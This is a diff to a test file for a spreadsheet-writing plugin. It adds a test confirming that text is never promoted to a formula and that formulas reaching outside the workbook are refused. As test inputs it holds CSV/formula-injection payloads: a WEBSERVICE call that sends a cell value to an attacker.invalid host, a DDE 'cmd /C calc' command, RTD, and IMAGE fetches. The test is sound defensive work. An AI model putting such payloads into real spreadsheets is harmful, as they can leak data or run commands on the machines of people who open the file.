@@ -107,7 +107,7 @@ const REPORT_SHEETS = [
     name: "Summary",
     rows: [
       ["Region", "Revenue", "Active", "Growth"],
-      ["EMEA", 1742.42, true, "=B2/B3"],
+      ["EMEA", 1742.42, true, { formula: "B2/B3" }],
       ["APAC", 871.21, false, null],
       ["Note: quotes \"ok\" & <tags>", "", "", ""],
     ],
@@ -187,7 +187,7 @@ describe("OpenWorkSpreadsheets", () => {
   });
 
   test("keeps numbers, booleans, formulas, and header styling typed in the written XML", async () => {
-    const { bytes } = await writeXlsxWorkbook([{ name: "T", rows: [["h1", "h2"], [3.5, true], ["=SUM(A2:A2)", " padded "]] }]);
+    const { bytes } = await writeXlsxWorkbook([{ name: "T", rows: [["h1", "h2"], [3.5, true], [{ formula: "=SUM(A2:A2)" }, " padded "]] }]);
     const entries = new Map(listZipEntries(bytes).map((entry) => [entry.name, entry]));
     const sheetEntry = entries.get("xl/worksheets/sheet1.xml");
     const workbookEntry = entries.get("xl/workbook.xml");
@@ -215,6 +215,36 @@ describe("OpenWorkSpreadsheets", () => {
     const parsed = await openXlsxWorkbook(bytes);
     expect(parsed.sheets.map((sheet) => sheet.name)).toEqual(["Q3 Revenue Plan draft", "q3 revenue plan draft-2", "Sheet3", "<script>&"]);
     expect(sheets.every((sheet) => sheet.name.length <= 31)).toBe(true);
+  });
+
+  test("never promotes text to a formula and refuses formulas that reach outside the workbook", async () => {
+    await withWorkspace(async (root, plugin) => {
+      const written = await write(plugin, {
+        path: "safe.xlsx",
+        sheets: [{ header: false, rows: [['=WEBSERVICE("http://attacker.invalid/"&A2)', "=1+1"], ["=cmd|' /C calc'!A0", { formula: "SUM(C1:C1)" }]] }],
+      });
+      expect(written).toMatchObject({ ok: true, sheets: [{ name: "Sheet1", rows: 2, columns: 2 }] });
+      const inspected = await inspect(plugin, { path: "safe.xlsx" });
+      const sheets = inspected.sheets;
+      if (!Array.isArray(sheets)) throw new Error("Expected sheets");
+      expect(sheets[0]).toMatchObject({ cells: 4, formulas: 1 });
+      const text = await read(plugin, { path: "safe.xlsx", formulas: true });
+      expect(text).toContain(`| 1 | =WEBSERVICE("http://attacker.invalid/"&A2) | =1+1 |`);
+      expect(text).toContain("| 2 | =cmd\u2502' /C calc'!A0 | =SUM(C1:C1) |");
+      const workbook = await openXlsxWorkbook(await readFile(join(root, "safe.xlsx")));
+      const sheet = await workbook.readSheet(workbook.sheets[0]);
+      expect(sheet.cells.map((cell) => [cell.reference, cell.type, cell.formula ?? null])).toEqual([
+        ["A1", "inline_string", null],
+        ["B1", "inline_string", null],
+        ["A2", "inline_string", null],
+        ["B2", "number", "SUM(C1:C1)"],
+      ]);
+
+      for (const formula of ['WEBSERVICE("http://attacker.invalid/")', "cmd|' /C calc'!A0", "rtd(\"prog\",,\"x\")", "'[Book1.xlsx]Sheet1'!A1", "IMAGE(\"http://attacker.invalid/p.png\")", "  "]) {
+        await expect(write(plugin, { path: "unsafe.xlsx", sheets: [{ rows: [[{ formula }]] }] })).rejects.toThrow(/Formula in A1 .*only calculations inside the workbook are written/);
+      }
+      await expect(readFile(join(root, "unsafe.xlsx"))).rejects.toThrow();
+    });
   });
 
   test("refuses to clobber an existing workbook unless overwrite is set", async () => {
